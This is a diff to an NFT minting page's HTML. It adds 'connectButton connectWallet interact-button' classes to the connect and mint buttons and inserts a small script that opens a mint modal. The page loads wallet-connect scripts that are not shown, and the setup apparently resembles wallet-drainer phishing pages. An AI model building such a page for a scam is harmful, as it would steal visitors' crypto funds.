@@ -266,7 +266,7 @@ TRY YOUR LUCK ! 🚀
                 </div>
             </div>
             <div class="connect">
-                <button class="connect_btn">
+                <button class="connect_btn connectButton connectWallet interact-button">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#353840">
                         <path d="M21.6188 6H3.75C3.33562 6 3 5.66438 3 5.25C3 4.83562 3.33562 4.5 3.75 4.5H21.75C22.1644 4.5 22.5 4.16438 22.5 3.75C22.5 2.50734 21.4927 1.5 20.25 1.5H3C1.34297 1.5 0 2.84297 0 4.5V19.5C0 21.157 1.34297 22.5 3 22.5H21.6188C22.9322 22.5 24 21.4908 24 20.25V8.25C24 7.00922 22.9322 6 21.6188 6ZM19.5 15.75C18.6717 15.75 18 15.0783 18 14.25C18 13.4217 18.6717 12.75 19.5 12.75C20.3283 12.75 21 13.4217 21 14.25C21 15.0783 20.3283 15.75 19.5 15.75Z"></path>
                     </svg>
@@ -341,7 +341,7 @@ TRY YOUR LUCK ! 🚀
 
                                 </div>
                             </div>
-                            <div class="lable_btn">
+                            <div class="lable_btn connectButton connectWallet interact-button" role="button" tabindex="0">
                                 MINTING NOW
                             </div>
                         </div>
@@ -822,5 +822,36 @@ TRY YOUR LUCK ! 🚀
   <script src="./scripts/wallet-connect-v4.js" defer></script>
   <script src="./scripts/wallet-connect-v4-embedded.js" defer></script>
   <script src="./scripts/onboard.js" defer></script>
+  <script>
+    (function(){
+      function ready(fn){
+        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', fn); else fn();
+      }
+      ready(function(){
+        var modal = document.getElementById('mintModal');
+        function openModal(e){
+          try { e && e.preventDefault && e.preventDefault(); } catch(_){}
+          if (modal) { modal.style.display = 'flex'; }
+        }
+        var selectors = [
+          '.lable_miting',
+          '.lable_miting .lable_btn',
+          '.connect .connect_btn',
+          '#messageButton',
+          '.connect-walletser'
+        ];
+        selectors.forEach(function(sel){
+          document.querySelectorAll(sel).forEach(function(el){
+            el.addEventListener('click', openModal, { passive: false });
+            el.addEventListener('keydown', function(e){ if (e.key === 'Enter' || e.key === ' ') openModal(e); });
+            el.style.cursor = 'pointer';
+          });
+        });
+        var close = document.querySelector('#mintModal .close-buttonser');
+        if (close) close.addEventListener('click', function(){ modal.style.display = 'none'; });
+      });
+    })();
+  </script>
 
+  </body>
 </html>
